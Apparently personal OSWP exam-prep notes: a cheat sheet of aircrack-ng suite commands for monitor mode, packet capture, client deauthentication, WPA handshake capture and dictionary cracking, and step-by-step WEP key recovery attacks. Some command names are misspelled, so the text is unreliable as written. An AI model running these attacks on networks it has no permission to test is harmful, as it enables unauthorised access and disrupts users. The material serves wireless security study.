# oswp
oswp-prep

airmon-ng check
airmon-ng check kill

airmon-ng start <interface>
airmon-ng stop <interface>

iw dev <interface> info
iwconfig <interface>


airodump-ng -c <cahnnel_number> <interface>

airodump-ng -c <cahnnel_number> --bssid <mac_address_ap> <interface>
airodump-ng -c <cahnnel_number> -w <saved_file_name> --output-format csv,pcap <interface>

aireplay-ng 
              --deauth       --> -0
              --fakeauth     --> -1
              --interactive  --> -2
              --arpplay      --> -3
              --chopchop     --> -4
              --fragment     --> -5
              --caffe-latte  --> -6
              --cfrag        --> -7
              --migmade      --> -8
              --test         --> -9

aireplay-ng -9 <interface>
aireplay-ng -9 -e <wifi_name> -a <mac_address_ap> <interface>
aireplay-ng -9 -e <wifi_name> -a <mac_address_ap> -D <interface>

aireplay-ng -9 -i <interface1> <interface2>


aircrack-ng -S

airdecap-ng
airdecap-ng -b <mac_address_ap> <cap_file_name.cap> ---> cap_file_name_dec.cap


airgraph-ng (CAPR)
airgraph-ng -i <file.csv> -o capr.png -g CAPR
ristretto capr.png


4 way handsake 

AUTH 
    -> PSK
    -> GMT

airodump-ng -c <cahnnel_number> -w <file_name> --essid <wifi_name> --bssid <mac_address_ap> <interface>
aireplay-ng -0 1 -a <mac_address_ap> -c <client_mac_address> <interface>
aircrack-ng -w <wordlist_file> -e <wifi_name> -b <mac_address_ap> <captured_handsake_file>

airdecap-ng -b <mac_address_ap> -e <wifi_name> -p <password> <captured_file>

/usr/share/wordlist
/usr/share


JtR
Crunch
RsMangler


john --wordlist=<file> --rules --stdout | aircrack-ng -e <wifi_name> -w - <captured_file>

hashcat -m 2500
cap2hccapx


WEP Example
-----------

airmon-ng start <interface>

airodump-ng -c <channel_number> --bssid <mac_address_ap> <interface> -w <file_name>

aireplay_ng -1 0 -e <wifi_name> -a <mac_address_ap> -h <fake_client_mac_or_station> <interface>

aireplay-ng -5 -b <mac_address_ap> -h <fake_client_mac_or_station> <interface>

packerforge-ng -0 -a <mac_address_ap> -h <fake_client_mac_or_station> -I <ip> -k <ip_broadcast> -y fragment.xor -w <captured_file_name>

airplay-ng -2 -r <captured_file_name> <interface>

WEP Example 2
-------------

airmon-ng start <interface>

airodump-ng -c <channel_number> --bssid <mac_address_ap> <interface> -w <file_name>

aireplay_ng -1 0 -e <wifi_name> -a <mac_address_ap> -h <fake_client_mac_or_station> <interface>

aireplay_ng -1 0 -e <wifi_name> -y <file_xor> -h <fake_client_mac_or_station> <interface>

aireplay-ng --arpplay -b <mac_address_ap> -h <fake_client_mac_or_station> <interface>

aircrack-ng -0 <captured_file>


WPA Example 1
-------------
airmon-ng start <interface>

airodump-ng -c <channel_number> --bssid <mac_address_ap> <interface> -w <file_name>

aireplay-ng -0 1 -a <mac_address_ap> -c <client_mac_address> <interface>

aircrack-ng -0 -w <wordlist> <captured_file_name>

